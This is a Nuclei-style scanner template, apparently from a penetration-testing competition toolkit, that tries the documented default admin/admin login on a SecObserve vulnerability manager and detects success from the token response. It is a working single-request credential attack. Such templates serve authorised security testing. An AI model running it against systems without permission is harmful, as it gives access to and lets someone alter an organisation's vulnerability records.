# SecObserve compose default credential check.
id: secobserve-default-login

info:
  name: SecObserve Default Credentials
  author: cptc-toolkit
  severity: high
  metadata:
    max-request: 1
    kind: attack
  description: |
    SecObserve is the lightweight OSS vulnerability manager teams deploy as the
    PSP analog. Its docker-compose documentation ships a default administrator
    admin/admin and stock deployments keep it.

    This template POSTs the documented default to the auth endpoint and matches
    the token response. A match means the vulnerability-management plane is
    accessible: every Nessus import, every remediation status and every finding
    the SOC tracked is readable - and re-writable.

    One POST request. The credential is a documented compose default.
  reference:
    - https://github.com/MaibornWolff/SecObserve
  tags: secops,secobserve,default-login,attack,themepark

http:
  - raw:
      - |
        POST /api/session/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"username":"admin","password":"admin"}
    redirects: false
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        condition: or
        words:
          - '"token"'
          - '"access"'
          - '"Authorization"'
      - type: dsl
        dsl:
          - "contains(to_lower(content_type), 'json')"
      - type: word
        part: body
        negative: true
        words:
          - '"non_field_errors"'
          - "invalid"
